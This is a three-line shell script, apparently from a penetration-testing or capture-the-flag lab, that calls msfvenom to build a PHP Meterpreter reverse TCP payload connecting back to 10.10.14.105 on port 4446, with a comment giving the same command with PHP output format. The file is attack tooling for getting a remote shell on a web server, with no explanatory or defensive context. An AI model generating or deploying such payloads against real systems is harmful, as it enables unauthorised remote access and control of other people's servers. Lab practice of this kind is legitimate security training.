#!/bin/sh
# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=4446 -f php
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=4446
